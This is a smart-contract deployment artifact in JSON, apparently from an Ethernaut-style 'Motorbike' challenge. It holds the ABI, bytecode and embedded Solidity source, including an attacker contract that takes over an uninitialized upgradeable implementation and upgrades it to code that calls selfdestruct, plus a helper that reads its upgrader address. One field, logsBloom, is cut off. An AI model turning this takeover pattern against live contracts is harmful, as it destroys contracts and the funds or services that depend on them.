{
  "address": "0xC98051FbB02cdF969F71D6DAE497af6b5aB3B401",
  "abi": [
    {
      "inputs": [],
      "name": "adr",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "name": "setTarget",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "target",
      "outputs": [
        {
          "internalType": "contract IEngine",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "upgrder",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "transactionHash": "0xdbab460eb9e3cb25b6d29792a4c39d6904e8c36aa9547752278deaa4b225f94e",
  "receipt": {
    "to": null,
    "from": "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
    "contractAddress": "0xC98051FbB02cdF969F71D6DAE497af6b5aB3B401",
    "transactionIndex": 213,
    "gasUsed": "161501",
    "logsBloom": "0x
    "blockHash": "0x760df7c05724507cec7cc3e14f1f60df0343fcf47992dc8db5b6e65358b5de4e",
    "transactionHash": "0xdbab460eb9e3cb25b6d29792a4c39d6904e8c36aa9547752278deaa4b225f94e",
    "logs": [],
    "blockNumber": 8224292,
    "cumulativeGasUsed": "30472462",
    "status": 1,
    "byzantium": true
  },
  "args": [],
  "numDeployments": 1,
  "solcInputHash": "f2f58802e6a74f5e2f08c3336c5c84fb",
  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"adr\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"}],\"name\":\"setTarget\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"contract IEngine\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"upgrder\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/motorbikeAttacker.sol\":\"Upgraderaddress2\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"},\"contracts/motorbikeAttacker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\n//Implemntation\\n//0x2968B0d0514c15Fc39880846EF9A3F161BabC61f\\n\\ninterface IEngine {\\n    function upgrader() external view returns (address);\\n    function initialize() external;\\n    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;\\n}\\n\\ncontract bikeAttacker2 {\\n    function pwn(IEngine target) external {\\n        target.initialize();\\n        target.upgradeToAndCall(address(this), abi.encodeWithSignature(\\\"kill\\\"));\\n    }\\n\\n    function kill() external{\\n        selfdestruct(payable(address(0)));\\n    }\\n}\\n\\ncontract Upgraderaddress2 {\\n    address public upgrder;\\n    IEngine public target;\\n\\n    function setTarget(address _target) public {\\n        target=IEngine(_target);\\n    }\\n\\n    function adr() public {\\n        upgrder = target.upgrader();\\n    }\\n}\\n\",\"keccak256\":\"0x3aba5a69a4449ca224e80e07326a2e925ee7f8085c4c620eb8f996a588cd9765\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b506101f5806100206000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80630aca7f9514610051578063776d1a011461005b578063c4649ad61461008b578063d4b83992146100ba575b600080fd5b6100596100cd565b005b61005961006936600461017e565b600180546001600160a01b0319166001600160a01b0392909216919091179055565b60005461009e906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60015461009e906001600160a01b031681565b600160009054906101000a90046001600160a01b03166001600160a01b031663af2697456040518163ffffffff1660e01b8152600401602060405180830381865afa158015610120573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061014491906101a2565b600080546001600160a01b0319166001600160a01b0392909216919091179055565b6001600160a01b038116811461017b57600080fd5b50565b60006020828403121561019057600080fd5b813561019b81610166565b9392505050565b6000602082840312156101b457600080fd5b815161019b8161016656fea26469706673582212202c1d629ba524385b469e681c5cb31fc8786110f35093c32885e2ec4fcf21c7d164736f6c63430008140033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b506004361061004c5760003560e01c80630aca7f9514610051578063776d1a011461005b578063c4649ad61461008b578063d4b83992146100ba575b600080fd5b6100596100cd565b005b61005961006936600461017e565b600180546001600160a01b0319166001600160a01b0392909216919091179055565b60005461009e906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60015461009e906001600160a01b031681565b600160009054906101000a90046001600160a01b03166001600160a01b031663af2697456040518163ffffffff1660e01b8152600401602060405180830381865afa158015610120573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061014491906101a2565b600080546001600160a01b0319166001600160a01b0392909216919091179055565b6001600160a01b038116811461017b57600080fd5b50565b60006020828403121561019057600080fd5b813561019b81610166565b9392505050565b6000602082840312156101b457600080fd5b815161019b8161016656fea26469706673582212202c1d629ba524385b469e681c5cb31fc8786110f35093c32885e2ec4fcf21c7d164736f6c63430008140033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 238,
        "contract": "contracts/motorbikeAttacker.sol:Upgraderaddress2",
        "label": "upgrder",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 241,
        "contract": "contracts/motorbikeAttacker.sol:Upgraderaddress2",
        "label": "target",
        "offset": 0,
        "slot": "1",
        "type": "t_contract(IEngine)196"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_contract(IEngine)196": {
        "encoding": "inplace",
        "label": "contract IEngine",
        "numberOfBytes": "20"
      }
    }
  }
}